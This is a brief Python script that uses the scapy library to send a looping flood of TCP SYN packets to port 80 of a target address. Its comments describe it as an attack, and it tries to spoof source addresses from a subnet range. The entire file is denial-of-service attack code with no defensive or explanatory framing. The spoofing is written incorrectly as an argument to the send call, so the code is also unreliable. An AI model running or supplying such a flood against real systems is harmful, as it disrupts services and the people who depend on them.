import scapy.all as sc

# Define the target IP address and port number
target_ip = '192.168.1.100'
target_port = 80

# Define the source IP address range to use for the attack
src_ip_range = '192.168.1.1/24'

# Craft TCP SYN packets and send them to the target IP address and port number
pkt = sc.IP(dst=target_ip)/sc.TCP(dport=target_port, flags='S')
sc.send(pkt, count=100, iface='eth0', inter=0.1, loop=1, verbose=0, src=sc.RandIP(src_ip_range))

